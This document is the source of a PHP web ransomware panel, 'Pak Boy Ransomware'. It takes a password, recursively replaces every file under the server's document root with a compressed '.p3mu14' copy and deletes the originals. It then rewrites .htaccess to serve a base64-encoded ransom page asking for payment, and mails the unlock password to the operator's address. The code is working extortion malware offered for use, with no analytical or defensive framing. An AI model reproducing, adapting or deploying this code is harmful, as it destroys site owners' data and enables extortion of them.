<title>Pak Boy Ransomware</title>
<meta name='description' content='pak boy Ransomeware'>
<meta property='og:image'content='https://1.bp.blogspot.com/-yz7LWYSwqXE/XtSgaWJIE6I/AAAAAAAAARc/qaPW4pSzhN8I0OHKiFI5NgNq6_pf0mpVQCK4BGAsYHg/w420-h280-p-k-no-nu/images%2B%252821%2529.jpeg'>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />
  <!-- main stylesheet -->
  <link href='http://fonts.googleapis.com/css?family=Federant' rel='stylesheet' type='text/css'/>
     <link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css" />
<style>

h1{
font-family: 'Iceland', cursive;
    text-align: center;
    color: yellow;
    font-weight: bold;
    font-size: 50px;
             
}
html {
background: #1A1C1F;
    color: red;
    text-shadow: 3px 3px 9px blue;
}
input {   border: 1px solid #15CFF4;
  width: 200px;
  height: 25px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background: transparent;
  color: gold;
  font-family:Iceland;
  font-size: 13px;
 text-align: center; }
.submite{
       border-style: dotted;
    border-color: red;
    background-color: transparent;
    color: yellow;
}

</style>

<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.p3mu14') !== false) {
    return;
	}
	file_put_contents($filename.".p3mu14", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
copy('x.php','x1.php');
$file = base64_decode("PHRpdGxlPlJhbnNvbXdhcmU8L3RpdGxlPgo8bWV0YSBuYW1lPSdkZXNjcmlwdGlvbicgY29udGVudD0ncGFrIGJveSBSYW5zb21ld2FyZSc+CjxtZXRhIHByb3BlcnR5PSdvZzppbWFnZSdjb250ZW50PSdodHRwczovLzEuYnAuYmxvZ3Nwb3QuY29tLy15ejdMV1lTd3FYRS9YdFNnYVdKSUU2SS9BQUFBQUFBQUFSYy9xYVBXNHBTemhOOEkwT0hLaUZJNU5nTnE2X3BmMG1wVlFDSzRCR0FzWUhnL3c0MjAtaDI4MC1wLWstbm8tbnUvaW1hZ2VzJTJCJTI1MjgyMSUyNTI5LmpwZWcnPgogICAgIDxsaW5rIGhyZWY9Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUljZWxhbmQiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+CjxzdHlsZT4KaDEgewpmb250LWZhbWlseTogJ0ljZWxhbmQnLCBjdXJzaXZlOwogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgY29sb3I6IHllbGxvdzsKICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgZm9udC1zaXplOiA1MHB4OwogICAgICAgICAgICAgCn0KaHRtbCB7CmJhY2tncm91bmQ6ICMxQTFDMUY7CiAgICBjb2xvcjogd2hpdGU7CiAgICB0ZXh0LXNoYWRvdzogM3B4IDNweCA5cHggYmx1ZTsKfQppbnB1dCB7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBjb2xvcjogcmVkOyBib3JkZXI6IDFweCBzb2xpZCB5ZWxsb3c7IHRleHQtYWxpZ246IGNlbnRlcjtmb250LXNpemU6IDExOyB9Cjwvc3R5bGU+Cgo8P3BocAplcnJvcl9yZXBvcnRpbmcoMCk7CiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOwokcGFzcyA9ICJhcmlmcGFzcyI7CmlmKGlzc2V0KCRpbnB1dCkpIHsKaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsKZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpewoJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcucDNtdTE0JykgPT09IEZBTFNFKSB7CglyZXR1cm47Cgl9CgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOwoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5wM211MTQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7Cgl1bmxpbmsoJ3AzbXUxNC5waHAnKTsKCXVubGluaygnLmh0YWNjZXNzJyk7Cgl1bmxpbmsoJGZpbGVuYW1lKTsKCWVjaG8gIiRmaWxlbmFtZSBEZWNyeXB0ZWQgISEhPGJyPiI7Cn0KCmZ1bmN0aW9uIGRlY2RpcigkZGlyKXsKCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7CgkJZm9yZWFjaCgkZmlsZXMgYXMgJGZpbGUpIHsKCQkJaWYoaXNfZGlyKCRkaXIuIi8iLiRmaWxlKSl7CgkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOwoJCQl9ZWxzZSB7CgkJCQlkZWNmaWxlKCRkaXIuIi8iLiRmaWxlKTsKCQl9Cgl9Cn0KCmRlY2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKZWNobyAiPGJyPldlYnJvb3QgRGVjcnlwdGVkPGJyPiI7CnVubGluaygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7CnVubGluaygnLmh0YWNjZXNzJyk7CmNvcHkoJ2h0YWJhY2t1cCcsJy5odGFjY2VzcycpOwplY2hvICdTdWNjZXNzICEhISc7Cn0gZWxzZSB7CmVjaG8gJ0ZhaWxlZCBQYXNzd29yZCAhISEgPGJyPjxicj4gSWYgeW91IGRvbnQga25vdyB0aGUgZGFuZ2VycyBvZiByYW5zb213YXJlLCByZWFkIHRoZSBhcnRpY2xlIGhlcmUgPGJyPjxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmUiPj4+Pmh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmU8PDwgPC9hPjxicj5Zb3UgY2FuIGNvbnRhY3QgZW1haWxzIDxicj4gPT09PT09PT09PT09PT09PT09PT09PT09PT0gJzsKfQpleGl0KCk7Cn0KPz4KPGNlbnRlcj4KPGgxPjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz4KLy88IVtDREFUQVsKCi8qClRla3MgYmVyZ2FudGktZ2FudGkgd2FybmEgU2NyaXB0IGJ5IE1hdHQgSGVkZ2Vjb2UKRmVhdHVyZWQgb24gSmF2YVNjcmlwdCBLaXQsIHZpc2l0IGh0dHA6Ly93d3cuamF2YXNjcmlwdGtpdC5jb20vc2NyaXB0L3NjcmlwdDIvcmFpbmJvd3RleHQuc2h0bWwKKi8KdmFyIHRleHQ9IiBZb3VyIFdlYnNpdGUgSXMgTG9ja2VkICIKdmFyIHNwZWVkPTIvLwppZiAoZG9jdW1lbnQuYWxsfHxkb2N1bWVudC5nZXRFbGVtZW50QnlJZCl7CmRvY3VtZW50LndyaXRlKCc8c3BhbiBpZD0iaGlnaGxpZ2h0Ij4nICsgdGV4dCArICc8L3NwYW4+JykKdmFyIHN0b3JldGV4dD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZD8gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhpZ2hsaWdodCIpIDogZG9jdW1lbnQuYWxsLmhpZ2hsaWdodAp9CmVsc2UKZG9jdW1lbnQud3JpdGUodGV4dCkKdmFyIGhleD1uZXcgQXJyYXkoIjAwIiwiMTQiLCIyOCIsIjNDIiwiNTAiLCI2NCIsIjc4IiwiOEMiLCJBMCIsIkI0IiwiQzgiLCJEQyIsIkYwIikKdmFyIHI9MQp2YXIgZz0xCnZhciBiPTEKdmFyIHNlcT0xCmZ1bmN0aW9uIGNoYW5nZXRleHQoKXsKcmFpbmJvdz0iIyIraGV4W3JdK2hleFtnXStoZXhbYl0Kc3RvcmV0ZXh0LnN0eWxlLmNvbG9yPXJhaW5ib3cKfQpmdW5jdGlvbiBjaGFuZ2UoKXsKaWYgKHNlcT09Nil7CmItLQppZiAoYj09MCkKc2VxPTEKfQppZiAoc2VxPT01KXsKcisrCmlmIChyPT0xMikKc2VxPTYKfQppZiAoc2VxPT00KXsKZy0tCmlmIChnPT0wKQpzZXE9NQp9CmlmIChzZXE9PTMpewpiKysKaWYgKGI9PTEyKQpzZXE9NAp9CmlmIChzZXE9PTIpewpyLS0KaWYgKHI9PTApCnNlcT0zCn0KaWYgKHNlcT09MSl7CmcrKwppZiAoZz09MTIpCnNlcT0yCn0KY2hhbmdldGV4dCgpCn0KZnVuY3Rpb24gc3RhcnRlZmZlY3QoKXsKaWYgKGRvY3VtZW50LmFsbHx8ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQpCmZsYXNoPXNldEludGVydmFsKCJjaGFuZ2UoKSIsc3BlZWQpCn0Kc3RhcnRlZmZlY3QoKQovL11dPgo8L3NjcmlwdD48L2gxPgo8Zm9udCBjb2xvcj0icmVkIiBzdHlsZT0idGV4dC1zaGFkb3c6IDNweCAzcHggOXB4IGJsdWU7IGZvbnQtc2l6ZTogMTJweDsiPgogICAgICAgICAgICAgICAgICAgIAo8cHJlPgouLsK2wrbCtsK2wrbCtsK2wrY34oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrYK4oCmLsK2wrbCtsK2wrbCtsK2wrbCtsK24oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtgrigKYuwrbCtsK2wrbCtsK2wrbCtsK2wrbCtuKApuKApuKApuKApuKApuKApuKApuKApi4uwrbCtsK2wrbCtsK2wrbCtsK2CuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtuKApuKApuKApuKApuKApuKApuKApi7CtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCmLi7CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtuKApuKApuKApuKApuKApi7CtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK24oCm4oCm4oCm4oCmLi7CtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCmLi7CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbigKbigKbigKbigKbCtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtjfigKbigKbCtsK2wrbCtsK2wrbCtsK2wrY3CuKApuKApuKApuKApuKApuKApuKApi43wrbCtsK2wrbCtsK2wrbCtsK2wrbigKYub8K2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCmLm/CtsK2wrbCtsK2wrbCtsK24oCmLsK2wrbCtsK2wrbCtsK2CuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApi7CtsK2wrbCtm/CtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCmLm/CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2CuKApuKApuKApuKApuKApuKApuKApi7CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2NwrigKbigKbigKbigKbigKYuwrbCtsK2wrbigKbigKbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtgrigKbigKbigKbigKYuLsK2wrbCtsK24oCm4oCm4oCmLsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2CuKApuKApuKApuKApsK2wrbCtsK2wrbCtuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtgrigKbigKbigKbigKbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2CuKApuKApuKApuKApi4uwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2CuKApuKApuKApuKApuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCm4oCm4oCm4oCmLjfCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2CuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApm/CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYK4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYxIAo8L3ByZT4KCjwvZm9udD4KPGgxPjxTQ1JJUFQ+CmZhcmJiaWJsaW90aGVrID0gbmV3IEFycmF5KCk7CmZhcmJiaWJsaW90aGVrWzBdID0gbmV3IEFycmF5KCIjRkYwMDAwIiwiI0ZGMTEwMCIsIiNGRjIyMDAiLCIjRkYzMzAwIiwiI0ZGNDQwMCIsIiNGRjU1MDAiLCIjRkY2NjAwIiwiI0ZGNzcwMCIsIiNGRjg4MDAiLCIjRkY5OTAwIiwiI0ZGYWEwMCIsIiNGRmJiMDAiLCIjRkZjYzAwIiwiI0ZGZGQwMCIsIiNGRmVlMDAiLCIjRkZmZjAwIiwiI0ZGZWUwMCIsIiNGRmRkMDAiLCIjRkZjYzAwIiwiI0ZGYmIwMCIsIiNGRmFhMDAiLCIjRkY5OTAwIiwiI0ZGODgwMCIsIiNGRjc3MDAiLCIjRkY2NjAwIiwiI0ZGNTUwMCIsIiNGRjQ0MDAiLCIjRkYzMzAwIiwiI0ZGMjIwMCIsIiNGRjExMDAiKTsKZmFyYmJpYmxpb3RoZWtbMV0gPSBuZXcgQXJyYXkoIiNGRjAwMDAiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRjAwMDAiKTsKZmFyYmJpYmxpb3RoZWtbMl0gPSBuZXcgQXJyYXkoIiNGRkZGRkYiLCIjRkYwMDAwIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIpOwpmYXJiYmlibGlvdGhla1szXSA9IG5ldyBBcnJheSgiI0ZGMDAwMCIsIiNGRjQwMDAiLCIjRkY4MDAwIiwiI0ZGQzAwMCIsIiNGRkZGMDAiLCIjQzBGRjAwIiwiIzgwRkYwMCIsIiM0MEZGMDAiLCIjMDBGRjAwIiwiIzAwRkY0MCIsIiMwMEZGODAiLCIjMDBGRkMwIiwiIzAwRkZGRiIsIiMwMEMwRkYiLCIjMDA4MEZGIiwiIzAwNDBGRiIsIiMwMDAwRkYiLCIjNDAwMEZGIiwiIzgwMDBGRiIsIiNDMDAwRkYiLCIjRkYwMEZGIiwiI0ZGMDBDMCIsIiNGRjAwODAiLCIjRkYwMDQwIik7CmZhcmJiaWJsaW90aGVrWzRdID0gbmV3IEFycmF5KCIjRkYwMDAwIiwiI0VFMDAwMCIsIiNERDAwMDAiLCIjQ0MwMDAwIiwiI0JCMDAwMCIsIiNBQTAwMDAiLCIjOTkwMDAwIiwiIzg4MDAwMCIsIiM3NzAwMDAiLCIjNjYwMDAwIiwiIzU1MDAwMCIsIiM0NDAwMDAiLCIjMzMwMDAwIiwiIzIyMDAwMCIsIiMxMTAwMDAiLCIjMDAwMDAwIiwiIzExMDAwMCIsIiMyMjAwMDAiLCIjMzMwMDAwIiwiIzQ0MDAwMCIsIiM1NTAwMDAiLCIjNjYwMDAwIiwiIzc3MDAwMCIsIiM4ODAwMDAiLCIjOTkwMDAwIiwiI0FBMDAwMCIsIiNCQjAwMDAiLCIjQ0MwMDAwIiwiI0REMDAwMCIsIiNFRTAwMDAiKTsKZmFyYmJpYmxpb3RoZWtbNV0gPSBuZXcgQXJyYXkoIiNGRjAwMDAiLCIjRkYwMDAwIiwiI0ZGMDAwMCIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIpOwpmYXJiYmlibGlvdGhla1s2XSA9IG5ldyBBcnJheSgiI0ZGMDAwMCIsIiNGREY1RTYiKTsKZmFyYmVuID0gZmFyYmJpYmxpb3RoZWtbNF07CmZ1bmN0aW9uIGZhcmJzY2hyaWZ0KCkKewpmb3IodmFyIGk9MCA7IGk8QnVjaHN0YWJlLmxlbmd0aDsgaSsrKQp7CmRvY3VtZW50LmFsbFsiYSIraV0uc3R5bGUuY29sb3I9ZmFyYmVuW2ldOwp9CmZhcmJ2ZXJsYXVmKCk7Cn0KZnVuY3Rpb24gc3RyaW5nMmFycmF5KHRleHQpCnsKQnVjaHN0YWJlID0gbmV3IEFycmF5KCk7CndoaWxlKGZhcmJlbi5sZW5ndGg8dGV4dC5sZW5ndGgpCnsKZmFyYmVuID0gZmFyYmVuLmNvbmNhdChmYXJiZW4pOwp9Cms9MDsKd2hpbGUoazw9dGV4dC5sZW5ndGgpCnsKQnVjaHN0YWJlW2tdID0gdGV4dC5jaGFyQXQoayk7CmsrKzsKfQp9CmZ1bmN0aW9uIGRpdnNlcnpldWdlbigpCnsKZm9yKHZhciBpPTAgOyBpPEJ1Y2hzdGFiZS5sZW5ndGg7IGkrKykKewpkb2N1bWVudC53cml0ZSgiPHNwYW4gaWQ9J2EiK2krIicgY2xhc3M9J2EiK2krIic+IitCdWNoc3RhYmVbaV0gKyAiPC9zcGFuPiIpOwp9CmZhcmJzY2hyaWZ0KCk7Cn0KdmFyIGE9MTsKZnVuY3Rpb24gZmFyYnZlcmxhdWYoKQp7CmZvcih2YXIgaT0wIDsgaTxmYXJiZW4ubGVuZ3RoOyBpKyspCnsKZmFyYmVuW2ktMV09ZmFyYmVuW2ldOwp9CmZhcmJlbltmYXJiZW4ubGVuZ3RoLTFdPWZhcmJlblstMV07CnNldFRpbWVvdXQoImZhcmJzY2hyaWZ0KCkiLDMwKTsKfQovLwp2YXIgZmFyYnNhdHo9MTsKZnVuY3Rpb24gZmFyYnRhdXNjaGVyKCkKewpmYXJiZW4gPSBmYXJiYmlibGlvdGhla1tmYXJic2F0el07CndoaWxlKGZhcmJlbi5sZW5ndGg8dGV4dC5sZW5ndGgpCnsKZmFyYmVuID0gZmFyYmVuLmNvbmNhdChmYXJiZW4pOwp9CmZhcmJzYXR6PU1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSooZmFyYmJpYmxpb3RoZWsubGVuZ3RoLTAuMDAwMSkpOwp9CnNldEludGVydmFsKCJmYXJidGF1c2NoZXIoKSIsNTAwMCk7CnRleHQgPSJwYWsgYm95IFJhbnNvbXdhcmUiOy8vaApzdHJpbmcyYXJyYXkodGV4dCk7CmRpdnNlcnpldWdlbigpOwovL2RvY3VtZW50LndyaXRlKHRleHQpOwo8L1NDUklQVD48L2gxPgo8aHI+PGZvbnQgY29sb3I9IndoaXRlIiBzdHlsZT0idGV4dC1zaGFkb3c6MHB4IDBweCAxMHB4ICMwMGZmZmYgLCAwcHggMHB4IDEwcHggIzAwZmZmZjtmb250LXNpemU6IDEyIj48YnI+CjxoMz5Zb3VyIFdlYnNpdGUgSXMgTG9ja2VkISEhPC9oMz4KCgpEb24ndCBDaGFuZ2UgdGhlIEZpbGVuYW1lIGJlY2F1c2UgaXQgQ2FuIERhbWFnZSB0aGUgRmlsZSBJZiBZb3UgV2FudCB0byBSZXR1cm4gWW91IE11c3QgRW50ZXIgdGhlIFBhc3N3b3JkIEZpcnN0Cjxicj4KU2VuZCBNZSA1MCBGb3IgQmFjayBZb3VyIFdlYnNpdGUhISA8YnI+cmFuc29tZSBieSB0aGUgdGVhbSZuYnNwJm5ic3AmbmJzcCZuYnNwPGZvbnQgZmFjZT0iSWNlbGFuZCIgc3R5bGU9ImZvbnQtc2l6ZTogMTU7Y29sb3I6IHJlZDsiPnRpbTwvZm9udD48YnI+PGJyPgpwYXltZW50IHZpYSA6IGplbWJ1dCA8YnI+CnBheW1lbnQgYWRkcmVzcyA6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgIzE1Q0ZGNDsKICB3aWR0aDogMjAwcHg7CiAgaGVpZ2h0OiAxNXB4OwogIHBhZGRpbmctbGVmdDogNXB4OwogIG1hcmdpbjogMTBweCBhdXRvOwogIHJlc2l6ZTogbm9uZTsKICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICBjb2xvcjogZ29sZDsKICBmb250LWZhbWlseTpJY2VsYW5kOwogIGZvbnQtc2l6ZTogMTJweDsiIHZhbHVlPSJhbG0iPiAKPGJyPgo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjogMXB4IHNvbGlkICMxNUNGRjQ7CiAgd2lkdGg6IDIwMHB4OwogIGhlaWdodDogMTVweDsKICBwYWRkaW5nLWxlZnQ6IDVweDsKICBtYXJnaW46IDEwcHggYXV0bzsKICByZXNpemU6IG5vbmU7CiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgY29sb3I6IGdvbGQ7CiAgZm9udC1mYW1pbHk6SWNlbGFuZDsKICBmb250LXNpemU6IDEycHg7IiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPiA8aW5wdXQgdHlwZT0ic3VibWl0IiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgIzE1Q0ZGNDsKICB3aWR0aDogNTBweDsKICBoZWlnaHQ6IDE1cHg7CiAgcGFkZGluZy1sZWZ0OiA1cHg7CiAgbWFyZ2luOiAxMHB4IGF1dG87CiAgcmVzaXplOiBub25lOwogIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OwogIGNvbG9yOiBnb2xkOwogIGZvbnQtZmFtaWx5OkljZWxhbmQ7CiAgZm9udC1zaXplOiAxMnB4OyIgdmFsdWU9IlVubG9jayI+CjwvZm9ybT4KPC9mb250Pjxicj5Db250YWN0IE1haWwgOiBhci5nYW1pbmc4NzRAZ21haWwuY29t");
$q = str_replace('arifpass', md5($_POST['pass']), $file);
$w = str_replace('ar.gaming874@gmail.com', $_POST['email'], $q);
$e = str_replace('jembut', $_POST['via'], $w);
$r = str_replace('50', '$'.$_POST['price'], $e);
$t = str_replace('alm', $_POST['add'], $r);
$y = str_replace('tim', $_POST['team'], $t);
$dec = $y;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('p3mu14.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex p3mu14.php\n
ErrorDocument 403 /p3mu14.php\n
ErrorDocument 404 /p3mu14.php\n
ErrorDocument 500 /p3mu14.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}
function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}
if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('p3mu14.php', $_SERVER['DOCUMENT_ROOT'].'/p3mu14.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>

<h1>Pak Boy RANSOMEWARE</h1>
<center>                     
<font color="white" style="text-shadow:0px 0px 10px #00ffff , 0px 0px 10px #00ffff;font-size: 15">
<br><br><hr><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('ar.gaming874@gmail.com',$subject,$message)) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Ransome : <input type="text" style="color: red;font-family: Iceland;font-size: 15" name="pass">&nbsp&nbspYour Email : <input type="email" style="color: yellow;font-family: Iceland;font-size: 15" name="email">
<br><br>
payment via : <select style=" border: 1px solid #15CFF4;
  width: 200px;
  height: 25px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background: transparent;
  color: gold;
  font-family:Iceland;
  font-size: 13px;
" name="via">
  <option value="Bitcoin">Bitcoin</option>
  <option value="Dana">Dana</option>
  <option value="Pay Pal">Pay pal</option>
  <option value="pulse">Perfect Money (PM)</option>
  <option value="pulse">pulse</option>
</select>&nbsp&nbsp&nbspYour Price :&nbsp&nbsp $<input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="price"><br><br>&nbsp&nbsppayment address : <input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="add">&nbsp&nbspYour Team :&nbsp<input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="team">
<br><br>
<input type="submit" class="submite" value="Locked">
</form></font>
<hr>
<address><small><font color="yellow">Pak boy Hacker Ransomeware >> Remake by ./p3mu14 </font></small></address>
